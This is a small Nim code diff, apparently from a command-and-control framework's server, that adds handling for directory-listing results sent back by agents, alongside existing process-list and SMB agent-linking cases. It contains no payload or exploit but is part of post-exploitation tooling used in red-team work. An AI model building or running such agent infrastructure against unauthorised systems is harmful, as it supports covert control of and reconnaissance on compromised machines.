@@ -171,6 +171,9 @@ proc handleResult*(resultData: seq[byte]) =
             of RESULT_PROCESSES: 
                 cq.client.sendProcessList(agentId, Bytes.toString(taskResult.data))
 
+            of RESULT_DIRECTORY_LISTING: 
+                cq.client.sendDirectoryListing(agentId, Bytes.toString(taskResult.data))
+
             of RESULT_LINK: 
                 # When an SMB agent is linked, the registration data is sent as the task result of the 'link' command
                 # We register the newly linked agent
